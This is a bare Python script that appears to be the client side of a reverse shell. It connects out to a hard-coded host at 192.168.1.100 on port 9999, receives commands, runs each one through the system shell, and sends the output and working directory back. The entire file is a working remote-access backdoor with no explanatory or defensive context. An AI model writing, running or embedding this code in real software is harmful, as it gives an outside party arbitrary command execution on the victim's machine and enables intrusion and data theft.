import socket
import os
import subprocess

host = "192.168.1.100"
port = 9999
s = socket.socket()
s.connect((host,port))

while True:
    data = s.recv(20480)
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_string = str(output_bytes, "utf-8")
        currentwd = os.getcwd() + ">"
        s.send(str.encode(output_string + currentwd))
